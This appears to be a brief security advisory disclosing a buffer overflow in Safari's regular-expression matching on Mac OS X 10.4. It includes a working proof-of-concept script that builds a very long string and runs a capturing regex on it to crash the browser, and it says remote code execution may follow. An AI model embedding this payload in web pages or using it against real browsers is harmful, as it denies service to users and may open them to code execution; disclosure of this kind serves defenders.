Subject: Apple Safari "match" Buffer Overflow Vulnerability

The following bug was tested on the latest version of Safari on a fully-patched Mac OS X 10.4. 

A remote attacker may exploit this issue to crash the application, effectively denying service to legitimate users. Successful exploitation could lead to remote code execution.

<script>
var reg = /(.)*/;
var z = 'Z';
while (z.length <= 8192) z+=z;
var boum = reg.exec(z);   
</script>
